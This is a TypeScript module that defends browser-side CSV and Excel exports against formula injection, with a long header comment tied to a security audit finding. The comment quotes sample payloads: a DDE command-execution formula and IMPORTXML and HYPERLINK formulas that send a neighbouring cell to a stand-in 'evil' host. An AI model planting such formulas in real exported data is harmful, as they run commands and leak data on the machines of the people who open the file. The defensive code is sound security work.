// ── CSV / EXCEL FORMULA INJECTION — H7, 2026-08-05 security audit ────────────────────────────────
//
// The TS twin of `backend/app/modules/notify/render.py`'s `_is_formula_risky` / `_write_text_cell`.
// One rule, two runtimes, so the browser export and the emailed server-rendered export behave
// identically (RULE FOUR: every report exports, and the two paths must not disagree).
//
// THE ATTACK. A cell whose text starts with `= + - @` or a leading TAB/CR/LF is evaluated by Excel
// and Google Sheets when the exported file is opened. Reports are emailed and WhatsApp'd to owners
// and DMs (RULE FOUR), so a payload sitting in ordinary tenant data — a store name, a note, a plan
// label — travels to a human and fires on their machine:
//     =cmd|'/C calc'!A0            (DDE command execution)
//     =IMPORTXML(CONCAT("http://evil/?",A2),"//a")   (silent exfiltration of the row next to it)
//     =HYPERLINK("http://evil/?"&A2,"Click for details")
//
// WHERE IT ACTUALLY BITES (measured on this codebase, not assumed — see harness section A/B):
//   · .xlsx via openpyxl (the BACKEND path): a leading "=" becomes a REAL FORMULA (`data_type 'f'`).
//     EXPLOITABLE. Fixed there.
//   · .xlsx via SheetJS 0.18.5 `aoa_to_sheet` (this file's path): every string is written `t:'s'`,
//     a text cell — NOT exploitable today. `pinSheetCellTypes()` below makes that a guarantee
//     instead of an accident, so a lib upgrade or swap cannot silently re-open it.
//   · CSV (`sheet_to_csv`, or any hand-rolled `join(',')` download): NO cell types exist, so every
//     one of `= + - @ TAB CR LF` is live. `csvField()` is the fix; use it in every CSV emitter.
//
// THE ANTI-REGRESSION RULE IS THE POINT. A naive "prefix everything with an apostrophe" turns
// -1234.56 into the text `'-1234.56` and silently breaks every money column in every export. So:
//   · non-strings (numbers, Dates, booleans) can never be formulas → never touched;
//   · a plain numeric string ("-1234.56", "+250", "-1,234.56", "-$99.00", "-3.5%", "1e5") is a
//     NUMBER to Excel, not a formula → never touched;
//   · dates never start with a risky character;
//   · "+1 (555) 123-4567" and "-Adjustment" ARE neutralised — and still display exactly as typed.

const RISKY_LEAD = new Set(['=', '+', '-', '@', '\t', '\r', '\n'])

// The only reason a legitimate cell begins with + or -: it is a number.
//   [sign] [$] digits[,groups] [.decimals] [e±exp] [%]
const NUMERICISH = /^[+-]?\$?\s*(\d{1,3}(,\d{3})+|\d+)(\.\d+)?([eE][+-]?\d+)?\s*%?$/

/** True only for a STRING a spreadsheet would evaluate, and that is not ordinary numeric data. */
export function isFormulaRisky(value: unknown): boolean {
  if (typeof value !== 'string' || value.length === 0) return false
  if (!RISKY_LEAD.has(value[0])) return false
  return !NUMERICISH.test(value.trim())
}

/**
 * One CSV field, safe to open in Excel/Sheets, RFC-4180 quoted.
 * A risky value is prefixed with a single apostrophe — the only option CSV offers, since a CSV cell
 * carries no type. Excel and Sheets both render the apostrophe as the "text" marker rather than as
 * content. Legitimate values (including every money figure) come back byte-identical.
 */
export function csvField(value: unknown): string {
  if (value == null) return ''
  const s = typeof value === 'string' ? value : String(value)
  const body = isFormulaRisky(s) ? `'${s}` : s
  return /[",\r\n]/.test(body) ? `"${body.replace(/"/g, '""')}"` : body
}

/** A whole CSV row. */
export function csvRow(values: unknown[]): string {
  return values.map(csvField).join(',')
}

/** A whole CSV document (rows already as arrays), CRLF per RFC 4180. */
export function toCsv(rows: unknown[][]): string {
  return rows.map(csvRow).join('\r\n')
}

/**
 * Defence in depth for a SheetJS worksheet: guarantee no cell is a formula and that every risky
 * string is explicitly typed as text. With xlsx@0.18.5 `aoa_to_sheet` this is already true, so the
 * call is a no-op on today's data — its job is to make the guarantee survive a library change.
 * Mutates and returns the worksheet.
 */
export function pinSheetCellTypes(ws: any): any {
  if (!ws || typeof ws !== 'object') return ws
  for (const ref of Object.keys(ws)) {
    if (ref[0] === '!') continue                   // '!ref', '!cols', '!merges' … are not cells
    const cell = ws[ref]
    if (!cell || typeof cell !== 'object') continue
    if ('f' in cell) delete cell.f                 // never emit a formula from a data export
    if (typeof cell.v === 'string' && isFormulaRisky(cell.v)) {
      cell.t = 's'                                 // text cell — Excel shows it, never runs it
      delete cell.w                                // drop any cached formatted text
    }
  }
  return ws
}
